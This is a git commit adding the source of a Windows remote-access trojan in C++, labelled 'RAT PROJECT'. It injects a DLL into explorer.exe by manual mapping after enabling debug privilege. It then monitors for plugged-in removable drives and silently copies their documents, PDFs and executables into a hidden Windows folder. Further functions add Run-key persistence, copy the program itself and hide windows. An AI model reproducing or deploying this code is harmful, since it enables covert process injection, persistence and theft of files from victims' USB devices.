144912d2b6b522c69ee6e982d2a6b720a46fb23e
irfan <69608835+calomity@users.noreply.github.com>
2021-12-16 21:51:59 +0300

    rat
    it is inject chavo with manualmap(writing dll to exe)

---
+++ RAT PROJECT/main.cpp
@@ -0,0 +1,291 @@
+﻿#include "rat.h"
+
+bool IsCorrectTargetArchitecture(HANDLE hProc) {
+    BOOL bTarget = FALSE;
+    if (!IsWow64Process(hProc, &bTarget)) {
+        Logger("Can't confirm target process architecture");
+        return false;
+    }
+
+    BOOL bHost = FALSE;
+    IsWow64Process(GetCurrentProcess(), &bHost);
+
+    return (bTarget == bHost);
+}
+DWORD pidof(const wchar_t* processImage)
+{
+    HANDLE hSsnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    DWORD pid = NULL;
+    if (hSsnapshot != INVALID_HANDLE_VALUE)
+    {
+        PROCESSENTRY32 pe32;
+        pe32.dwSize = sizeof(PROCESSENTRY32);
+        if (Process32First(hSsnapshot, &pe32))
+        {
+            do {
+                if (!wcscmp(processImage, pe32.szExeFile))
+                {
+                    pid = pe32.th32ProcessID;
+                    break;
+                }
+            } while (Process32Next(hSsnapshot, &pe32));
+        }
+        CloseHandle(hSsnapshot);
+    }
+    return pid;
+}
+
+static void controldll(void)
+{
+    if (PathFileExists(L"chavo_source.dll") == FALSE)
+    {
+        Logger("chavo_source.dll cant found");
+        _exit(1);
+    }
+    else
+    {
+        Logger("i found dll");
+    }
+}
+
+static const void regeditrun()
+{
+    HKEY hKey;
+    if (RegOpenKeyEx(HKEY_CURRENT_USER, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
+    {
+        LPCTSTR regszstring = L"deneme";
+        if (RegSetValueEx(hKey, TEXT("systemcli"), 0L, REG_SZ, (CONST BYTE*)regszstring, sizeof(TCHAR) * (strlen((CONST CHAR*)regszstring) + MAX_LENGTH)) == ERROR_SUCCESS) 
+        {
+            Logger("successfully added to regedit for run");
+            RegCloseKey(hKey);
+        }
+    }
+}
+
+static const void copyitself(TCHAR loc[])
+{
+    TCHAR exename[MAX_PATH];
+    DWORD getname = GetModuleFileName(NULL, exename, MAX_PATH);
+    if (getname)
+    {
+        std::filesystem::copy(exename, loc);
+    }
+    else
+    {
+        Logger("i cant get exename");
+    }
+}
+
+std::string createcalofolder(std::string extentions)
+{
+    std::string makefolder = "mkdir ";
+    makefolder += "C:\\Windows\\calo\\";
+    makefolder += extentions;
+    system(makefolder.c_str());
+    std::string calofolder = "C:\\Windows\\calo\\" + extentions + "\\";
+    return calofolder;
+}
+
+std::string getvolumelabel(LPCWSTR drive)
+{
+    WCHAR szVolumeName[MAX_PATH];
+    BOOL bSucceeded = GetVolumeInformation(drive,
+        szVolumeName,
+        MAX_PATH,
+        NULL,
+        NULL,
+        NULL,
+        NULL,
+        0);
+    std::wstring wstring(szVolumeName);
+    std::string volumelabel(wstring.begin(), wstring.end());
+    return volumelabel;
+}
+
+static void computerusername(void)
+{
+    union pc
+    {
+        char username[MAX_COMPUTERNAME_LENGTH + 1];
+    };
+    DWORD usernametickcount = MAX_COMPUTERNAME_LENGTH + 1;
+    pc computer = { 0 };
+
+    if (!GetComputerNameA(&computer.username[0], &usernametickcount))
+    {
+        Logger("Fail to get compuer username");
+    }
+    else
+    {
+        std::string computerusername1 = "computer username ";
+        computerusername1 += static_cast<std::string>(std::string(computer.username));
+        Logger(computerusername1);
+    }
+}
+
+BOOL detectexplorerexerestart()
+{
+    DWORD ProcessID = pidof(L"explorer.exe");
+    HANDLE hHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessID);
+    HANDLE hNewHandle;
+    RegisterWaitForSingleObject(&hNewHandle, hHandle, WaitOrTimerCallback, NULL, INFINITE, WT_EXECUTEONLYONCE);
+    return TRUE;
+}
+
+int wmain(int argc, wchar_t* argv[], wchar_t* envp[])
+{
+    mtx.lock();
+    Logger("logs removed");
+    system("rmdir c:\\logs /s /Q");
+    system("mkdir c:\\logs");
+    Logger("logs created");
+    Logger("computerusername func");
+    computerusername();
+    Logger("search dll");
+    Logger("starting manual mapping");
+    const wchar_t* dllPath = L"C:\\Users\\calo\\source\\repos\\chavo_source\\x64\\Debug\\chavo_source.dll";
+    DWORD PID;
+    std::string pname = "explorer.exe";
+    Logger("Process Name");
+    Logger(pname);
+    char* vIn = (char*)pname.c_str();
+    wchar_t* vOut = new wchar_t[strlen(vIn) + 1];
+    mbstowcs_s(NULL, vOut, strlen(vIn) + 1, vIn, strlen(vIn));
+    PID = pidof(vOut);
+    Logger("Process pid taked");
+    TOKEN_PRIVILEGES priv = { 0 };
+    HANDLE hToken = NULL;
+    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
+        priv.PrivilegeCount = 1;
+        priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+        if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
+            AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL);
+
+        CloseHandle(hToken);
+    }
+
+    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
+    if (!hProc)
+    {
+        DWORD Err = GetLastError();
+        Logger("OpenProcess failed");
+    }
+
+    if (!IsCorrectTargetArchitecture(hProc))
+    {
+        Logger("Invalid Process Architecture");
+        CloseHandle(hProc);
+    }
+
+    if (GetFileAttributes(dllPath) == INVALID_FILE_ATTRIBUTES)
+    {
+        Logger("Dll file doesn't exist");
+    }
+
+    std::ifstream File(dllPath, std::ios::binary | std::ios::ate);
+
+    if (File.fail()) {
+        Logger("Opening the file failed");
+        File.close();
+    }
+
+    auto FileSize = File.tellg();
+    if (FileSize < 0x1000) {
+        Logger("Filesize invalid");
+        File.close();
+    }
+
+    BYTE* pSrcData = new BYTE[(UINT_PTR)FileSize];
+    if (!pSrcData) {
+        Logger("Can't allocate dll file");
+        File.close();
+    }
+
+    File.seekg(0, std::ios::beg);
+    File.read((char*)(pSrcData), FileSize);
+    File.close();
+
+    Logger("Mapping...");
+    if (!ManualMapDll(hProc, pSrcData, FileSize)) {
+        delete[] pSrcData;
+        CloseHandle(hProc);
+        Logger("Error while mapping");
+    }
+    delete[] pSrcData;
+    CloseHandle(hProc);
+    Logger("OK");
+    Logger("mutex lock has been started");
+    //TCHAR loc[] = L"C:\\logs";
+    //copyitself(loc);
+    //regeditrun();
+    //controldll();
+    //system("Taskmgr.exe");
+    //ShowWindow(GetConsoleWindow(), SW_HIDE);
+    //HWND hwnd = FindWindowA(0,("Task Manager"));
+    //ShowWindow(hwnd, SW_HIDE);
+    Logger("try to get windows folder");
+    char buffer[MAX_PATH], drive;
+    GetSystemDirectory((LPWSTR)buffer, sizeof(buffer));
+    drive = *buffer;
+    std::string windowsdir = "in " + drive;
+    Logger(windowsdir);
+    if (drive == 'C')
+    {
+        Logger("windows working on c: disk");
+    }
+    controldevice(DRIVE_LIST);
+    Logger("loop has been started");
+    for (;;) 
+    {
+        controldevice(NEW_DRIVE_LIST);
+        detectexplorerexerestart();
+        if (restartdetected == TRUE)
+        {
+            Logger("restart detected");
+            restartdetected = FALSE;
+        }
+        for (int i = 0; i < MAX_LENGTH; i++) 
+        {
+            if ((NEW_DRIVE_LIST[i] >= 65 && NEW_DRIVE_LIST[i] <= 89) && (DRIVE_LIST[i] == '0'))
+            {
+                Logger("device plugged : ");
+                std::string drivelist;
+                drivelist.push_back(NEW_DRIVE_LIST[i]);
+                Logger(drivelist);
+                DRIVE_LIST[i] = NEW_DRIVE_LIST[i];
+                std::string newdevices;
+                newdevices.push_back(NEW_DRIVE_LIST[i]);
+                newdevices += ":\\";
+                std::cout << newdevices;
+                std::wstring stemp = std::wstring(newdevices.begin(), newdevices.end());
+                LPCWSTR sw = stemp.c_str();
+                std::string volumelabel = getvolumelabel(sw);
+                Logger(volumelabel);
+                copy_file_with_extentions(newdevices, createcalofolder(volumelabel + "\\" + txt), txt);
+                copy_file_with_extentions(newdevices, createcalofolder(volumelabel + "\\" + pdf), pdf);
+                copy_file_with_extentions(newdevices, createcalofolder(volumelabel + "\\" + exe), exe);
+                copy_file_with_extentions(newdevices, createcalofolder(volumelabel + "\\" + word), word);
+            }
+        }
+        for (int i = 0; i < MAX_LENGTH; i++) 
+        {
+            NEW_DRIVE_LIST[i] = '0';
+        }
+        controldevice(NEW_DRIVE_LIST);
+        for (int i = 0; i < MAX_LENGTH; i++) 
+        {
+            if ((DRIVE_LIST[i] >= 65 && DRIVE_LIST[i] <= 89) && (NEW_DRIVE_LIST[i] == '0')) 
+            {
+                Logger("device unplagged : ");
+                std::string drivelist;
+                drivelist.push_back(DRIVE_LIST[i]);
+                Logger(drivelist);
+                Sleep(500);
+                DRIVE_LIST[i] = NEW_DRIVE_LIST[i];
+            }
+        }
+        Sleep(200);
+    }
+    mtx.unlock();
+}
---
+++ RAT PROJECT/rat.h
@@ -0,0 +1,119 @@
+﻿#pragma once
+#define _CRT_SECURE_NO_WARNINGS
+#define _CRT_SECURE_CPP_OVERLOAD_STANDARD_NAMES 1
+#define _CRT_SECURE_CPP_OVERLOAD_STANDARD_NAMES_COUNT 1
+#define MAX_LENGTH 128
+#include <Windows.h>
+#include <time.h>
+#include <stdio.h>
+#include <string>
+#include <iostream>
+#include <direct.h>
+#include <tchar.h>
+#include <fstream>
+#include <ctime>
+#include <filesystem>
+#include <thread>
+#include <mutex>
+#include <winternl.h>
+#include <ntstatus.h>
+#include <TlHelp32.h>
+#include <Psapi.h>
+#include <Shlwapi.h>
+#include <string.h>
+#include <commdlg.h>
+#include <atomic>
+#include <conio.h>
+#include "injector.h"
+#pragma comment(lib, "Shlwapi.lib")
+std::mutex mtx;
+#define INFO_BUFFER_SIZE 32767
+TCHAR  infoBuf[INFO_BUFFER_SIZE];
+DWORD  bufCharCount = INFO_BUFFER_SIZE;
+char DRIVE_LIST[MAX_LENGTH];
+char NEW_DRIVE_LIST[MAX_LENGTH];
+std::string pdf = ".pdf";
+std::string txt = ".txt";
+std::string exe = ".exe";
+std::string word = ".docx";
+BOOL restartdetected = FALSE;
+VOID CALLBACK WaitOrTimerCallback(
+    _In_  PVOID lpParameter,
+    _In_  BOOLEAN TimerOrWaitFired
+)
+{
+    restartdetected = TRUE;
+    return;
+}
+void controldevice(char drive[]) {
+    int count = 0;
+    char szLogicalDrives[MAX_PATH];
+    size_t size = strlen(szLogicalDrives) + 1;
+    wchar_t* text = new wchar_t[size];
+    size_t outSize;
+    mbstowcs_s(&outSize, text, size, szLogicalDrives, size - 1);
+    DWORD dwResult = GetLogicalDriveStrings(MAX_PATH, text);
+    WCHAR* szSingleDrive = text;
+    while (*szSingleDrive)
+    {
+        UINT nDriveType = GetDriveType(szSingleDrive);
+        if (nDriveType == DRIVE_UNKNOWN) {
+        }
+        else if (nDriveType == DRIVE_NO_ROOT_DIR) {
+        }
+        else if (nDriveType == DRIVE_REMOVABLE) {
+            char letter = szSingleDrive[0];
+            drive[letter - 65] = letter;
+        }
+        else if (nDriveType == DRIVE_FIXED) {
+        }
+        else if (nDriveType == DRIVE_REMOTE) {
+        }
+        else if (nDriveType == DRIVE_CDROM) {
+        }
+        else if (nDriveType == DRIVE_RAMDISK) {
+        }
+        szSingleDrive += wcslen(szSingleDrive) + 1;
+    }
+}
+inline std::string getCurrentDateTime(std::string s) {
+    time_t now = time(0);
+    struct tm  tstruct;
+    char buf[80];
+    tstruct = *localtime(&now);
+    if (s == "now")
+        strftime(buf, sizeof(buf), "%Y-%m-%d %X", &tstruct);
+    else if (s == "date")
+        strftime(buf, sizeof(buf), "%Y-%m-%d", &tstruct);
+    return std::string(buf);
+};
+inline void Logger(std::string logMsg) {
+    std::string filePath = "c:\\logs\\log " + getCurrentDateTime("date") + ".txt";
+    std::string now = getCurrentDateTime("now");
+    std::ofstream ofs(filePath.c_str(), std::ios_base::out | std::ios_base::app);
+    ofs << now << ' ' << logMsg << '\n';
+    ofs.close();
+}
+static void copy_file_with_extentions(const std::string& path, const std::string& to, const std::string& extensions)
+{
+    for (auto& p : std::filesystem::recursive_directory_iterator(path, std::filesystem::directory_options::skip_permission_denied))
+    {
+        if (p.path().extension() == extensions)
+        {
+            std::string data123;
+            data123 = p.path().string();
+            std::filesystem::permissions(data123,
+                std::filesystem::perms::owner_all | std::filesystem::perms::group_all,
+                std::filesystem::perm_options::add);
+            Logger(data123);
+            try
+            {
+                std::filesystem::copy(data123, to);
+            }
+            catch (std::exception& e)
+            {
+                Logger(e.what());
+            }
+        }
+    }
+}
